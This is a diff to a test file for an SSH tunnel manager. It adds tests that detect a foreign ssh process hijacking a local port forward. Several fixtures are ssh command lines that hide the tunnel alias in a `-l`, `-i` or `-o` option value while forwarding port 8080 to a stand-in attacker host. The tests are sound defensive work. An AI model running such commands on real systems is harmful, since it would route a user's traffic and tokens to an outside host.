@@ -19,6 +19,7 @@ import {
   classifyAgentState,
   classifyPortOwner,
   parsePortListeners,
+  sshDestination,
   tunnelState,
   ensureTunnel,
   SELF_DISABLE_MARKER,
@@ -154,6 +155,19 @@ test("classifyPortOwner: ours requires OUR forward signature, not just COMMAND=s
   ];
   assert.equal(classifyPortOwner(aliasSubstring, spec), "foreign");
 
+  // OPTION-VALUE ATTACK (P1, PR #26 review): a foreign ssh passes the alias as the `-l` LOGIN NAME
+  // while really dialing the attacker host and forwarding our local port. The alias appears as a
+  // token but is NOT the destination operand — must be "foreign", or connect sends the token there.
+  const aliasAsLoginName = [
+    { command: "ssh", pid: "202", argv: "ssh -N -l browse-gateway-tunnel -L 8080:127.0.0.1:8080 attacker@elsewhere" },
+  ];
+  assert.equal(classifyPortOwner(aliasAsLoginName, spec), "foreign");
+  // Same idea via -o / -i carrying the alias as a value.
+  const aliasAsOptValue = [
+    { command: "ssh", pid: "203", argv: "ssh -i browse-gateway-tunnel -L 8080:127.0.0.1:8080 attacker@host" },
+  ];
+  assert.equal(classifyPortOwner(aliasAsOptValue, spec), "foreign");
+
   // gatewayHost DRIFT (F3): our own healthy keeper still forwards the OLD target after a config
   // change (the on-disk keeper is never rewritten). Local port + alias token still mark it "ours".
   const drifted = [{ command: "ssh", pid: "5", argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:9090 browse-gateway-tunnel" }];
@@ -176,6 +190,22 @@ test("classifyPortOwner: ours requires OUR forward signature, not just COMMAND=s
   assert.equal(classifyPortOwner([], spec), "none");
   assert.equal(classifyPortOwner(null, spec), "none");
   rmSync(spec.home, { recursive: true, force: true });
+});
+
+test("sshDestination locates the host operand, not an option value", () => {
+  const dest = (cmd) => sshDestination(cmd.split(/\s+/));
+  // Our keeper's shape.
+  assert.equal(dest("/usr/bin/ssh -N -T -L 8080:127.0.0.1:8080 browse-gateway-tunnel"), "browse-gateway-tunnel");
+  // Value-taking options must not be mistaken for the destination.
+  assert.equal(dest("ssh -N -l browse-gateway-tunnel -L 8080:127.0.0.1:8080 attacker@elsewhere"), "attacker@elsewhere");
+  assert.equal(dest("ssh -i browse-gateway-tunnel -L 8080:1 host"), "host");
+  assert.equal(dest("ssh -o User=browse-gateway-tunnel -p 22 realhost"), "realhost");
+  // Attached value + bundled no-arg flags.
+  assert.equal(dest("ssh -NT -L8080:127.0.0.1:8080 alias"), "alias");
+  // End-of-options marker.
+  assert.equal(dest("ssh -N -- some-host"), "some-host");
+  // No operand → null (fail closed at the caller).
+  assert.equal(dest("ssh -N -L 8080:127.0.0.1:8080"), null);
 });
 
 test("tunnelState resolves listener argv via ps to distinguish our forward from a foreign ssh", async () => {
